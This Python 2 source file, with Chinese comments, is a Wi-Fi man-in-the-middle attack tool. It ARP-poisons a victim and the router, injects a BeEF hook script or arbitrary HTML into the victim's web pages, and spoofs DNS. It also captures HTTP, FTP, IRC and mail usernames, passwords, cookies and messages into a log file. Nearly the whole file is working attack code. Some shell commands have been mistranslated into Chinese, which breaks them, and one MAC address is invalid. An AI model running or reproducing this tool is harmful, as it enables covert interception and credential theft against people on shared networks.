#!/usr/bin/env python2
# -*- coding: utf-8 -*-
'''
运行环境:
               nmap (optional)
               nbtscan (optional)
               aircrack-ng
               Python 2.6+
               nfqueue-bindings 0.4-3
               scapy
               twisted

'''


def module_check(module):
    '''
    只能 运行在 基于 debian 的 系统上 , 例如 Kali 和 Ubuntu
    '''
    ri = raw_input(
        '[-] python-%s 没有 被安装 , 现在 是否 需要安装 ? (apt-get install -y python-%s will be run if yes) [y/n]: ' % (
            module, module))
    if ri == 'y':
        os.system('apt-get install -y python-%s' % module)
    else:
        exit('[-] 退出: 因为 运行环境 缺失依赖')

import os
try:
    import nfqueue
except Exception:
    module_check('nfqueue')
    import nfqueue
import logging

logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
from scapy.all import *
conf.verb = 0

conf.checkIPaddr = 0
from twisted.internet import reactor
from twisted.internet import reactor
from twisted.internet.interfaces import IReadDescriptor
from twisted.internet.protocol import Protocol, Factory
from sys import exit
from threading import Thread, Lock
import argparse
from base64 import b64decode
from subprocess import *
from zlib import decompressobj, decompress
import gzip
from cStringIO import StringIO
import requests
import sys
import time
#from signal import SIGINT, signal
import signal
import socket
import fcntl


def parse_args():
    
    parser = argparse.ArgumentParser()
    parser.add_argument("-b", "--beef",
                        help="复制beef 钩子, 将URL注入到每一页目标的访问, 例如：WifiAttack.py -b http://192.168.1.10:3000/hook.js")
    parser.add_argument("-c", "--code",
                        help="注入任意HTML代码注入到目标的访问页面; 当选择html代码注入时应该包含括号: -c '<title>New title</title>'")
    parser.add_argument("-u", "--urlspy",
                        help="展示所有的URL并且搜索目标的访问的URL中的.jpg, .png, .gif, .css, 和 .js; 截断150个字符和图像过滤/CSS/JS/WOFF/SVG的网址 . 使用参数 -v 打印所有的URL.",
                        action="store_true")
    parser.add_argument("-ip", "--ipaddress",
                        help="接收到该目标的的IP并且跳转到 arp ping 开始列出可能的目标列表. Usage: -ip <victim IP>")
    parser.add_argument("-vmac", "--victimmac",
                        help="设置目标的 MAC地址; 通过默认的脚本加入一些不同的方式用来获得这个选项")
    parser.add_argument("-d", "--driftnet", 
                        help="用 driftnet打开一个xter窗口m.", 
                        action="store_true")
    parser.add_argument("-v", "--verboseURL",
                        help="展示所有目标的访问的URL, 但是不仅限于URL的150个字符, 例如参数 -u .",
                        action="store_true")
    parser.add_argument("-dns", "--dnsspoof",
                        help="欺骗域名的DNS;例如：-dns facebook.com 将DNS欺​​骗,每个DNS请求都将挟持到facebook.com或subdomain.facebook.com. ")
    parser.add_argument("-a", "--dnsall", 
                        help="欺骗所有的DNS", 
                        action="store_true")
    parser.add_argument("-set", "--setoolkit", 
                        help="在另一个窗口中启动Social Engineer's Toolkit.",
                        action="store_true")
    parser.add_argument("-p", "--post",
                        help="打印不确定的 HTTP POST 加载, IMAP/POP/FTP/IRC/HTTP usernames/passwords 和 incoming/outgoing emails. 并且可以解码 base64 编码的 POP/IMAP username/password .",
                        action="store_true")
    parser.add_argument("-na", "--nmapaggressive",
                        help="在后台对目标开放的端口和服务进行全面进攻性的扫描. 输出到 ip.add.re.ss.log.txt .",
                        action="store_true")
    parser.add_argument("-n", "--nmap",
                        help="执行目标IP的快速扫描nmap.",
                        action="store_true")
    parser.add_argument("-i", "--interface",
                        help="选择可用的接口. 默认优先展示在第一个接口路由`ip route`,例如：-i wlan0 ")
    parser.add_argument("-r", "--redirectto",
                        help="必须使用 -dns DOMAIN 选项. 当目标访问任何域名的时候都将目标的IP重定向到这个ipaddress ")
    parser.add_argument("-rip", "--routerip",
                        help="设置 router IP; 通过默认的脚本加入一些不同的方式用来获得这个选项 ")
    parser.add_argument("-rmac", "--routermac",
                        help="设置 router MAC ; 通过默认的脚本加入一些不同的方式用来获得这个选项 ")
    parser.add_argument("-pcap", "--pcap", 
                        help="分析pcap文件")

    return parser.parse_args()


W = '\033[0m'  # white (normal)
R = '\033[31m'  # red
G = '\033[32m'  # green
O = '\033[33m'  # orange
B = '\033[34m'  # blue
P = '\033[35m'  # purple
C = '\033[36m'  # cyan
GR = '\033[37m'  # gray
T = '\033[93m'  # tan

#############################
####  WifiAttack.py Code ####
#############################

interface = ''

def WifiAttackMain(args):
    global victimIP, interface,routerIP,victimMAC,routerMAC,ipf

   
    ipr = Popen(['/sbin/ip', 'route'], stdout=PIPE, stderr=DN)
    ipr = ipr.communicate()[0]
    iprs = ipr.split('\n')
    ipr = ipr.split()
    if args.routerip:
        routerIP = args.routerip
    else:
        try:
            routerIP = ipr[2]
        except:
            exit("使用之前 必须先连接 互联网.")
    for r in iprs:
        if '/' in r:
            IPprefix = r.split()[0]
    if args.interface:
        interface = args.interface
    else:
        interface = ipr[4]
    if 'eth' in interface or 'p3p' in interface:
        exit(
            '若是发现默认路由是有线接口，请用无线连接，然后重试，或使用-i [interface]选项 指定 活动接口。使用 [IP address]或[ifconfig ] 查看活动接口.')
    if args.ipaddress:
        victimIP = args.ipaddress
    else:
        au = active_users()
        au.users(IPprefix, routerIP)
        print '\n[*] 关闭监控模式'
        os.system('airmon-ng 停止 %s >/dev/null 2>&1' % au.monmode)
        os.system('服务 network-manager 重启')
        try:
            victimIP = raw_input('[*] 进入 non-router IP 欺骗: ')
        except KeyboardInterrupt:
            exit('\n[-] 退出中 ')

    print "[*] 查找 DHCP 和 DNS 服务器地址..."
  
    dhcp = (Ether(dst='ff:ff:ff:ff:ff:ff') /
            IP(src="0.0.0.0", dst="255.255.255.255") /
            UDP(sport=68, dport=67) /
            BOOTP(chaddr='E3:2E:F4:DD:8R:9A') /
            DHCP(options=[("message-type", "discover"),
                          ("param_req_list",
                           chr(DHCPRevOptions["router"][0]),
                           chr(DHCPRevOptions["domain"][0]),
                           chr(DHCPRevOptions["server_id"][0]),
                           chr(DHCPRevOptions["name_server"][0]),
                          ), "end"]))
    ans, unans = srp(dhcp, timeout=5, retry=1)
    if ans:
        for s, r in ans:
            DHCPopt = r[0][DHCP].options
            DHCPsrvr = r[0][IP].src
            for x in DHCPopt:
                if 'domain' in x:
                    local_domain = x[1]
                    pass
                else:
                    local_domain = 'None'
                if 'name_server' in x:
                    dnsIP = x[1]
    else:
        print "[-] DNS 服务器 没有响应 . 设置 DNS 和 DHCP 服务器 到 路由 IP."
        dnsIP = routerIP
        DHCPsrvr = routerIP
        local_domain = 'None'

    
    print_vars(DHCPsrvr, dnsIP, local_domain, routerIP, victimIP)
    if args.routermac:
        routerMAC = args.routermac
        print "[*] Router MAC: " + routerMAC
        logger.write("[*] Router MAC: " + routerMAC + '\n')
    else:
        try:
            routerMAC = Spoof().originalMAC(routerIP)
            print "[*] Router MAC: " + routerMAC
            logger.write("[*] Router MAC: " + routerMAC + '\n')
        except Exception:
            print "[-] 路由器 没有响应 ARP 请求; 请尝试 从本地 ARP 存放处 拉取 MAC 地址 - [/usr/bin/arp -n]"
            logger.write(
                "[-] 路由器 没有响应 ARP 请求; 请尝试 从本地 ARP 存放处 拉取 MAC 地址 - [/usr/bin/arp -n]")
            try:
                arpcache = Popen(['/usr/sbin/arp', '-n'], stdout=PIPE, stderr=DN)
                split_lines = arpcache.communicate()[0].splitlines()
                for line in split_lines:
                    if routerIP in line:
                        routerMACguess = line.split()[2]
                        if len(routerMACguess) == 17:
                            accr = raw_input("[+]  " + R + routerMACguess + W + " 是 精确的 router MAC 地址 ? [y/n]: ")
                            if accr == 'y':
                                routerMAC = routerMACguess
                                print "[*] Router MAC: " + routerMAC
                                logger.write("[*] Router MAC: " + routerMAC + '\n')
                        else:
                            exit("[-] 获取 精确的 router MAC 地址 失败 ")
            except Exception:
                exit("[-] 获取 精确的 router MAC 地址 失败 ")

    if args.victimmac:
        victimMAC = args.victimmac
        print "[*] 目标的 MAC: " + victimMAC
        logger.write("[*] 目标的 MAC: " + victimMAC + '\n')
    else:
        try:
            victimMAC = Spoof().originalMAC(victimIP)
            print "[*] 目标的 MAC: " + victimMAC
            logger.write("[*] 目标的 MAC: " + victimMAC + '\n')
        except Exception:
            exit(
                "[-] 不能获取到 目标的 MAC 地址; 请尝试 -vmac [xx:xx:xx:xx:xx:xx] 选项， 如果你不知道 目标的 MAC 地址 \n    并且 确认 精确的 正在被使用的 接口，使用参数  -i <interface>")

    ipf = setup(victimMAC)
    Queued(args)
    threads(args)

    if args.nmap:
        print "\n[*] 进行 nmap 扫描 ; 这 需要 花费 几分钟 - [nmap -T4 -O %s]" % victimIP
        try:
            nmap = Popen(['/usr/bin/nmap', '-T4', '-O', '-e', interface, victimIP], stdout=PIPE, stderr=DN)
            nmap.wait()
            nmap = nmap.communicate()[0].splitlines()
            for x in nmap:
                if x != '':
                    print '[+]', x
                    logger.write('[+] ' + x + '\n')
        except Exception:
            print '[-] Nmap 扫描 端口 和 系统 失败 , 是否 安装 ?'

    print ''

    def signal_handler(signal, frame):
        print '学习IP表, 发送 healing 包 , 并且关闭路由转发功能...'
        logger.close()
        with open('/proc/sys/net/ipv4/ip_forward', 'r+') as forward:
            forward.write(ipf)
        Spoof().restore(routerIP, victimIP, routerMAC, victimMAC)
        Spoof().restore(routerIP, victimIP, routerMAC, victimMAC)
        os.system('/sbin/iptables -F')
        os.system('/sbin/iptables -X')
        os.system('/sbin/iptables -t nat -F')
        os.system('/sbin/iptables -t nat -X')
        exit(0)

    signal.signal(signal.SIGINT, signal_handler)

    while 1:
        Spoof().poison(routerIP, victimIP, routerMAC, victimMAC)
        time.sleep(1.5)

class Spoof():
    def originalMAC(self, ip):
        
        ans, unans = srp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip), timeout=5, retry=3)
        for s, r in ans:
            return r.sprintf("%Ether.src%")

    def poison(self, routerIP, victimIP, routerMAC, victimMAC):
        send(ARP(op=2, pdst=victimIP, psrc=routerIP, hwdst=victimMAC))
        send(ARP(op=2, pdst=routerIP, psrc=victimIP, hwdst=routerMAC))

    def restore(self, routerIP, victimIP, routerMAC, victimMAC):
        send(ARP(op=2, pdst=routerIP, psrc=victimIP, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=victimMAC), count=3)
        send(ARP(op=2, pdst=victimIP, psrc=routerIP, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=routerMAC), count=3)


class Parser():
    
    OheadersFound = []
    IheadersFound = []
    IMAPauth = 0
    IMAPdest = ''
    POPauth = 0
    POPdest = ''
    Cookies = []
    IRCnick = ''
    mail_passwds = []
    oldmailack = ''
    oldmailload = ''
    mailfragged = 0

    oldHTTPack = ''
    oldHTTPload = ''
    HTTPfragged = 0
    
    block_acks = []
    html_url = ''
    user_agent = None

    def __init__(self, args):
        self.args = args

    

    '''
    两者都通过接受参数作为一个数组，然后通过该数组迭代寻找有效载荷和自我取代。
    现在是Ubuntu和非Ubuntu的Linux版本都兼容。
    '''
    def start(*args):
        for i in args:
            if isinstance(i, nfqueue.payload):
                payload = i
            else:
                if not isinstance(i, int):
                    self = i
        if self.args.pcap:
            if self.args.ipaddress:
                try:
                    pkt = payload[IP]
                except Exception:
                    return
        else:
            try:
                pkt = IP(payload.get_data())
            except Exception:
                return

        IP_layer = pkt[IP]
        IP_dst = pkt[IP].dst
        IP_src = pkt[IP].src
        if self.args.urlspy or self.args.post or self.args.beef or self.args.code:
            if pkt.haslayer(Raw):
                if pkt.haslayer(TCP):
                    dport = pkt[TCP].dport
                    sport = pkt[TCP].sport
                    ack = pkt[TCP].ack
                    seq = pkt[TCP].seq
                    load = pkt[Raw].load
                    mail_ports = [25, 26, 110, 143]
                    if dport in mail_ports or sport in mail_ports:
                        self.mailspy(load, dport, sport, IP_dst, IP_src, mail_ports, ack)
                    if dport == 6667 or sport == 6667:
                        self.irc(load, dport, sport, IP_src)
                    if dport == 21 or sport == 21:
                        self.ftp(load, IP_dst, IP_src)
                    if dport == 80 or sport == 80:
                        self.http_parser(load, ack, dport)
                        if self.args.beef or self.args.code:
                            self.injecthtml(load, ack, pkt, payload, dport, sport)
        if self.args.dnsspoof or self.args.dnsall:
            if pkt.haslayer(DNSQR):
                dport = pkt[UDP].dport
                sport = pkt[UDP].sport
                if dport == 53 or sport == 53:
                    dns_layer = pkt[DNS]
                    self.dnsspoof(dns_layer, IP_src, IP_dst, sport, dport, payload)

    def get_user_agent(self, header_lines):
        for h in header_lines:
            user_agentre = re.search('[Uu]ser-[Aa]gent: ', h)
            if user_agentre:
                return h.split(user_agentre.group(), 1)[1]

    def injecthtml(self, load, ack, pkt, payload, dport, sport):
        for x in self.block_acks:
            if ack == x:
                payload.set_verdict(nfqueue.NF_DROP)
                return

        ack = str(ack)
        if self.args.beef:
            bhtml = '<script src=' + self.args.beef + '></script>'
        if self.args.code:
            chtml = self.args.code

        try:
            headers, body = load.split("\r\n\r\n", 1)
        except Exception:
            headers = load
            body = ''
        header_lines = headers.split("\r\n")

        if dport == 80:
            post = None
            get = self.get_get(header_lines)
            host = self.get_host(header_lines)
            self.html_url = self.get_url(host, get, post)
            if self.html_url:
                d = ['.jpg', '.jpeg', '.gif', '.png', '.css', '.ico', '.js', '.svg', '.woff']
                if any(i in self.html_url for i in d):
                    self.html_url = None
                    payload.set_verdict(nfqueue.NF_ACCEPT)
                    return
            else:
                payload.set_verdict(nfqueue.NF_ACCEPT)
                return
            if not self.get_user_agent(header_lines):
                
                self.user_agent = "'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/30.0.1599.101 Safari/537.36'"
            else:
                self.user_agent = "'" + self.get_user_agent(header_lines) + "'"
            payload.set_verdict(nfqueue.NF_ACCEPT)
            return

        if sport == 80 and self.html_url and 'Content-Type: text/html' in headers:
            
            header_lines = [x for x in header_lines if 'transfer-encoding' not in x.lower()]
            for h in header_lines:
                if '1.1 302' in h or '1.1 301' in h:  
                    payload.set_verdict(nfqueue.NF_ACCEPT)
                    self.html_url = None
                    return

            UA_header = {'User-Agent': self.user_agent}
            r = requests.get('http://' + self.html_url, headers=UA_header)
            try:
                body = r.text.encode('utf-8')
            except Exception:
                payload.set_verdict(nfqueue.NF_ACCEPT)

            
            if self.args.beef:
                if '<html' in body or '/html>' in body:
                    try:
                        psplit = body.split('</head>', 1)
                        body = psplit[0] + bhtml + '</head>' + psplit[1]
                    except Exception:
                        try:
                            psplit = body.split('<head>', 1)
                            body = psplit[0] + '<head>' + bhtml + psplit[1]
                        except Exception:
                            if not self.args.code:
                                self.html_url = None
                                payload.set_verdict(nfqueue.NF_ACCEPT)
                                return
                            else:
                                pass
            if self.args.code:
                if '<html' in body or '/html>' in body:
                    try:
                        psplit = body.split('<head>', 1)
                        body = psplit[0] + '<head>' + chtml + psplit[1]
                    except Exception:
                        try:
                            psplit = body.split('</head>', 1)
                            body = psplit[0] + chtml + '</head>' + psplit[1]
                        except Exception:
                            self.html_url = None
                            payload.set_verdict(nfqueue.NF_ACCEPT)
                            return

            
            if 'Content-Encoding: gzip' in headers:
                if body != '':
                    try:
                        comp_body = StringIO()
                        f = gzip.GzipFile(fileobj=comp_body, mode='w', compresslevel=9)
                        f.write(body)
                        f.close()
                        body = comp_body.getvalue()
                    except Exception:
                        try:
                            pkt[Raw].load = headers + "\r\n\r\n" + body
                            pkt[IP].len = len(str(pkt))
                            del pkt[IP].chksum
                            del pkt[TCP].chksum
                            payload.set_verdict_modified(nfqueue.NF_ACCEPT, str(pkt), len(pkt))
                            print '[-] 无法重新压缩HTML ，发送原样的数据包...'
                            self.html_url = None
                            return
                        except Exception:
                            self.html_url = None
                            payload.set_verdict(nfqueue.NF_ACCEPT)
                            return

            headers = "\r\n".join(header_lines)
            pkt[Raw].load = headers + "\r\n\r\n" + body
            pkt[IP].len = len(str(pkt))
            del pkt[IP].chksum
            del pkt[TCP].chksum
            try:
                payload.set_verdict(nfqueue.NF_DROP)
                pkt_frags = fragment(pkt)
                for p in pkt_frags:
                    send(p)
                print R + '[!] 注入 HTML 代码 到数据包 ' + W + self.html_url
                logger.write('[!] 注入 HTML 代码 到数据包 ' + self.html_url)
                self.block_acks.append(ack)
                self.html_url = None
            except Exception as e:
                payload.set_verdict(nfqueue.NF_ACCEPT)
                self.html_url = None
                print '[-] 注入到数据包失败 ', e
                return

            if len(self.block_acks) > 30:
                self.block_acks = self.block_acks[5:]

    def get_host(self, header_lines):
        for l in header_lines:
            searchHost = re.search('[Hh]ost: ', l)
            if searchHost:
                try:
                    return l.split('Host: ', 1)[1]
                except Exception:
                    try:
                        return l.split('host: ', 1)[1]
                    except Exception:
                        return

    def get_get(self, header_lines):
        for l in header_lines:
            searchGet = re.search('GET /', l)
            if searchGet:
                try:
                    return l.split('GET ')[1].split(' ')[0]
                except Exception:
                    return

    def get_post(self, header_lines):
        for l in header_lines:
            searchPost = re.search('POST /', l)
            if searchPost:
                try:
                    return l.split(' ')[1].split(' ')[0]
                except Exception:
                    return

    def get_url(self, host, get, post):
        if host:
            if post:
                return host + post
            if get:
                return host + get

  
    def searches(self, url, host):
        
        searched = re.search(
            '((search|query|search\?q|\?s|&q|\?q|search\?p|search[Tt]erm|keywords|command)=([^&][^&]*))', url)
        if searched:
            searched = searched.group(3)
            
            if 'select%20*%20from' in searched:
                pass
            if host == 'geo.yahoo.com':
                pass
            else:
                searched = searched.replace('+', ' ').replace('%20', ' ').replace('%3F', '?').replace('%27',
                                                                                                      '\'').replace(
                    '%40', '@').replace('%24', '$').replace('%3A', ':').replace('%3D', '=').replace('%22',
                                                                                                    '\"').replace('%24',
                                                                                                                  '$')
                print T + '[+] Searched ' + W + host + T + ': ' + searched + W
                logger.write('[+] Searched ' + host + ' for: ' + searched + '\n')

    def post_parser(self, url, body, host, header_lines):
        if 'ocsp' in url:
            print B + '[+] POST: ' + W + url
            logger.write('[+] POST: ' + url + '\n')
        elif body != '':
            try:
                urlsplit = url.split('/')
                url = urlsplit[0] + '/' + urlsplit[1]
            except Exception:
                pass
            if self.HTTPfragged == 1:
                print B + '[+] Fragmented POST: ' + W + url + B + " HTTP POST's combined load: " + body + W
                logger.write('[+] Fragmented POST: ' + url + " HTTP POST's combined load: " + body + '\n')
            else:
                print B + '[+] POST: ' + W + url + B + ' HTTP POST load: ' + body + W
                logger.write('[+] POST: ' + url + " HTTP POST's combined load: " + body + '\n')



            user_regex = '([Ee]mail|[Uu]ser|[Uu]sername|[Nn]ame|[Ll]ogin|[Ll]og|[Ll]ogin[Ii][Dd])=([^&|;]*)'
            
            pw_regex = '([Pp]assword|[Pp]ass|[Pp]asswd|[Pp]wd|[Pp][Ss][Ww]|[Pp]asswrd|[Pp]assw)=([^&|;]*)'
            username = re.findall(user_regex, body)
            password = re.findall(pw_regex, body)
            self.user_pass(username, password)
            self.cookies(host, header_lines)

    def http_parser(self, load, ack, dport):
        load = repr(load)[1:-1]
        
        if dport == 80 and load != '':
            if ack == self.oldHTTPack:
                self.oldHTTPload = self.oldHTTPload + load
                load = self.oldHTTPload
                self.HTTPfragged = 1
            else:
                self.oldHTTPload = load
                self.oldHTTPack = ack
                self.HTTPfragged = 0
        try:
            headers, body = load.split(r"\r\n\r\n", 1)
        except Exception:
            headers = load
            body = ''
        header_lines = headers.split(r"\r\n")

        host = self.get_host(header_lines)
        get = self.get_get(header_lines)
        post = self.get_post(header_lines)
        url = self.get_url(host, get, post)

        
        if url:
            
            if self.args.verboseURL:
                print '[*] ' + url
                logger.write('[*] ' + url + '\n')

            if self.args.urlspy:
                fileFilterList = ['.jpg', '.jpeg', '.gif', '.png', '.css', '.ico', '.js', '.svg', '.woff']
                domainFilterList = ['adzerk.net', 'adwords.google.com', 'googleads.g.doubleclick.net', 'pagead2.googlesyndication.com']
                tempURL = url
                tempURL = tempURL.split("?")[0]   
                tempURL = tempURL.strip("/")     
                printURL = True 
                for fileType in fileFilterList: 
                    if tempURL.endswith(fileType):
                        printURL = False 
                for blockedDomain in domainFilterList:
                    if blockedDomain in tempURL:
                        printURL = False 
                if printURL:
                    if len(url) > 146:
                        print '[*] ' + url[:145]
                        logger.write('[*] ' + url[:145] + '\n')
                    else:
                        print '[*] ' + url
                        logger.write('[*] ' + url + '\n')

            
            if self.args.post or self.args.urlspy:
                self.searches(url, host)

            
            if self.args.post and post:
                self.post_parser(url, body, host, header_lines)

    def ftp(self, load, IP_dst, IP_src):
        load = repr(load)[1:-1].replace(r"\r\n", "")
        if 'USER ' in load:
            print R + '[!] FTP ' + load + ' SERVER: ' + IP_dst + W
            logger.write('[!] FTP ' + load + ' SERVER: ' + IP_dst + '\n')
        if 'PASS ' in load:
            print R + '[!] FTP ' + load + ' SERVER: ' + IP_dst + W
            logger.write('[!] FTP ' + load + ' SERVER: ' + IP_dst + '\n')
        if 'authentication failed' in load:
            print R + '[*] FTP ' + load + W
            logger.write('[*] FTP ' + load + '\n')

    def irc(self, load, dport, sport, IP_src):
        load = repr(load)[1:-1].split(r"\r\n")
        if self.args.post:
            if IP_src == victimIP:
                if 'NICK ' in load[0]:
                    self.IRCnick = load[0].split('NICK ')[1]
                    server = load[1].replace('USER user user ', '').replace(' :user', '')
                    print R + '[!] IRC username: ' + self.IRCnick + ' on ' + server + W
                    logger.write('[!] IRC username: ' + self.IRCnick + ' on ' + server + '\n')
                if 'NS IDENTIFY ' in load[0]:
                    ircpass = load[0].split('NS IDENTIFY ')[1]
                    print R + '[!] IRC password: ' + ircpass + W
                    logger.write('[!] IRC password: ' + ircpass + '\n')
                if 'JOIN ' in load[0]:
                    join = load[0].split('JOIN ')[1]
                    print C + '[+] IRC joined: ' + W + join
                    logger.write('[+] IRC joined: ' + join + '\n')
                if 'PART ' in load[0]:
                    part = load[0].split('PART ')[1]
                    print C + '[+] IRC left: ' + W + part
                    logger.write('[+] IRC left: ' + part + '\n')
                if 'QUIT ' in load[0]:
                    quit = load[0].split('QUIT :')[1]
                    print C + '[+] IRC quit: ' + W + quit
                    logger.write('[+] IRC quit: ' + quit + '\n')
            

            if 'PRIVMSG ' in load[0]:
                if IP_src == victimIP:
                    load = load[0].split('PRIVMSG ')[1]
                    channel = load.split(' :', 1)[0]
                    ircmsg = load.split(' :', 1)[1]
                    if self.IRCnick != '':
                        print C + '[+] IRC victim ' + W + self.IRCnick + C + ' to ' + W + channel + C + ': ' + ircmsg + W
                        logger.write('[+] IRC ' + self.IRCnick + ' to ' + channel + ': ' + ircmsg + '\n')
                    else:
                        print C + '[+] IRC msg to ' + W + channel + C + ': ' + ircmsg + W
                        logger.write('[+] IRC msg to ' + channel + ':' + ircmsg + '\n')
                

                elif self.IRCnick in load[0] and self.IRCnick != '':
                    sender_nick = load[0].split(':', 1)[1].split('!', 1)[0]
                    try:
                        load = load[0].split('PRIVMSG ')[1].split(' :', 1)
                        channel = load[0]
                        ircmsg = load[1]
                        print C + '[+] IRC ' + W + sender_nick + C + ' to ' + W + channel + C + ': ' + ircmsg[1:] + W
                        logger.write('[+] IRC ' + sender_nick + ' to ' + channel + ': ' + ircmsg[1:] + '\n')
                    except Exception:
                        return

    def cookies(self, host, header_lines):
        for x in header_lines:
            if 'Cookie:' in x:
                if x in self.Cookies:
                    return
                elif 'safebrowsing.clients.google.com' in host:
                    return
                else:
                    self.Cookies.append(x)
                print P + '[+] 找到  Cookie  ' + W + host + P + ' 写进  WifiAttackpy.log.txt' + W
                logger.write('[+] 找到  Cookie  ' + host + ':' + x.replace('Cookie: ', '') + '\n')


    def user_pass(self, username, password):
        if username:
            for u in username:
                print R + '[!] 找到 Username : ' + u[1] + W
                logger.write('[!] Username: ' + u[1] + '\n')
        if password:
            for p in password:
                if p[1] != '':
                    print R + '[!] Password: ' + p[1] + W
                    logger.write('[!] Password: ' + p[1] + '\n')

    def mailspy(self, load, dport, sport, IP_dst, IP_src, mail_ports, ack):
        load = repr(load)[1:-1]
        
        if ack == self.oldmailack:
            if load != r'.\r\n':
                self.oldmailload = self.oldmailload + load
                load = self.oldmailload
                self.mailfragged = 1
        else:
            self.oldmailload = load
            self.oldmailack = ack
            self.mailfragged = 0

        try:
            headers, body = load.split(r"\r\n\r\n", 1)
        except Exception:
            headers = load
            body = ''
        header_lines = headers.split(r"\r\n")
        email_headers = ['Date: ', 'Subject: ', 'To: ', 'From: ']

        
        if dport in [25, 26, 110, 143]:
            self.passwords(IP_src, load, dport, IP_dst)
        
        if dport == 26 or dport == 25:
            self.outgoing(load, body, header_lines, email_headers, IP_src)
        
        if sport in [110, 143]:
            self.incoming(headers, body, header_lines, email_headers, sport, dport)

    def passwords(self, IP_src, load, dport, IP_dst):
        load = load.replace(r'\r\n', '')
        if dport == 143 and IP_src == victimIP and len(load) > 15:
            if self.IMAPauth == 1 and self.IMAPdest == IP_dst:
                
                for x in self.mail_passwds:
                    if load in x:
                        self.IMAPauth = 0
                        self.IMAPdest = ''
                        return
                print R + '[!] 找到 IMAP 用户 和 密码 : ' + load + W
                logger.write('[!] 找到 IMAP 用户 和 密码 :' + load + '\n')
                self.mail_passwds.append(load)
                self.decode(load, dport)
                self.IMAPauth = 0
                self.IMAPdest = ''
            if "authenticate plain" in load:
                self.IMAPauth = 1
                self.IMAPdest = IP_dst
        if dport == 110 and IP_src == victimIP:
            if self.POPauth == 1 and self.POPdest == IP_dst and len(load) > 10:
                
                for x in self.mail_passwds:
                    if load in x:
                        self.POPauth = 0
                        self.POPdest = ''
                        return
                print R + '[!] 找到 POP 用户 和 密码 : ' + load + W
                logger.write('[!] 找到 POP 用户 和 密码 : ' + load + '\n')
                self.mail_passwds.append(load)
                self.decode(load, dport)
                self.POPauth = 0
                self.POPdest = ''
            if 'AUTH PLAIN' in load:
                self.POPauth = 1
                self.POPdest = IP_dst
        if dport == 26:
            if 'AUTH PLAIN ' in load:
                
                for x in self.mail_passwds:
                    if load in x:
                        self.POPauth = 0
                        self.POPdest = ''
                        return
                print R + '[!] 找到 Mail 认证 : ' + load + W
                logger.write('[!] 找到 Mail 认证 : ' + load + '\n')
                self.mail_passwds.append(load)
                self.decode(load, dport)

    def outgoing(self, headers, body, header_lines, email_headers, IP_src):
        if 'Message-ID' in headers:
            for l in header_lines:
                for x in email_headers:
                    if x in l:
                        self.OheadersFound.append(l)
            
            if len(self.OheadersFound) > 3 and body != '':
                if self.mailfragged == 1:
                    print O + '[!] OUTGOING MESSAGE (fragmented)' + W
                    logger.write('[!] OUTGOING MESSAGE (fragmented)\n')
                    for x in self.OheadersFound:
                        print O + '   ', x + W
                        logger.write(' ' + x + '\n')
                    print O + '   Message:', body + W
                    logger.write(' Message:' + body + '\n')
                else:
                    print O + '[!] OUTGOING MESSAGE' + W
                    logger.write('[!] OUTGOING MESSAGE\n')
                    for x in self.OheadersFound:
                        print O + '   ', x + W
                        logger.write(' ' + x + '\n')
                    print O + '   Message:', body + W
                    logger.write(' Message:' + body + '\n')

        self.OheadersFound = []

    def incoming(self, headers, body, header_lines, email_headers, sport, dport):
        message = ''
        for l in header_lines:
            for x in email_headers:
                if x in l:
                    self.IheadersFound.append(l)
        if len(self.IheadersFound) > 3 and body != '':
            if "BODY[TEXT]" not in body:
                try:
                    beginning = body.split(r"\r\n", 1)[0]
                    body1 = body.split(r"\r\n\r\n", 1)[1]
                    message = body1.split(beginning)[0][:-8]  
                except Exception:
                    return
            if message != '':
                if self.mailfragged == 1:
                    print O + '[!] INCOMING MESSAGE (fragmented)' + W
                    logger.write('[!] INCOMING MESSAGE (fragmented)\n')
                    for x in self.IheadersFound:
                        print O + '   ' + x + W
                        logger.write(' ' + x + '\n')
                    print O + '   Message: ' + message + W
                    logger.write(' Message: ' + message + '\n')
                else:
                    print O + '[!] INCOMING MESSAGE' + W
                    logger.write('[!] INCOMING MESSAGE\n')
                    for x in self.IheadersFound:
                        print O + '   ' + x + W
                        logger.write(' ' + x + '\n')
                    print O + '   Message: ' + message + W
                    logger.write(' Message: ' + message + '\n')
        self.IheadersFound = []

    def decode(self, load, dport):
        decoded = ''
        if dport == 25 or dport == 26:
            try:
                b64str = load.replace("AUTH PLAIN ", "").replace(r"\r\n", "")
                decoded = repr(b64decode(b64str))[1:-1].replace(r'\x00', ' ')
            except Exception:
                pass
        else:
            try:
                b64str = load
                decoded = repr(b64decode(b64str))[1:-1].replace(r'\x00', ' ')
            except Exception:
                pass
        
        if '@' in decoded:
            print R + '[!] 解码: ' + decoded + W
            logger.write('[!] 解码: ' + decoded + '\n')

    
    def dnsspoof(self, dns_layer, IP_src, IP_dst, sport, dport, payload):
        localIP = [x[4] for x in scapy.all.conf.route.routes if x[2] != '0.0.0.0'][0]
        if self.args.dnsspoof:
            if self.args.dnsspoof in dns_layer.qd.qname and not self.args.redirectto:
                self.dnsspoof_actions(dns_layer, IP_src, IP_dst, sport, dport, payload, localIP)
            elif self.args.dnsspoof in dns_layer.qd.qname and self.args.redirectto:
                self.dnsspoof_actions(dns_layer, IP_src, IP_dst, sport, dport, payload, self.args.redirectto)
        elif self.args.dnsall:
            if self.args.redirectto:
                self.dnsspoof_actions(dns_layer, IP_src, IP_dst, sport, dport, payload, self.args.redirectto)
            else:
                self.dnsspoof_actions(dns_layer, IP_src, IP_dst, sport, dport, payload, localIP)


    def dnsspoof_actions(self, dns_layer, IP_src, IP_dst, sport, dport, payload, rIP):
        p = IP(dst=IP_src, src=IP_dst) / UDP(dport=sport, sport=dport) / DNS(id=dns_layer.id, qr=1, aa=1,
                                                                             qd=dns_layer.qd,
                                                                             an=DNSRR(rrname=dns_layer.qd.qname, ttl=10,
                                                                                      rdata=rIP))
        payload.set_verdict_modified(nfqueue.NF_ACCEPT, str(p), len(p))
        if self.args.dnsspoof:
            print G + '[!] 正在进行重定向... ' + W + self.args.dnsspoof + G + ' to ' + W + rIP
            logger.write('[!] 正在进行重定向... ' + self.args.dnsspoof + G + ' to ' + rIP + '\n')
        elif self.args.dnsall:
            print G + '[!] 正在进行重定向... ' + W + dns_layer[DNSQR].qname[:-1] + G + ' to ' + W + rIP
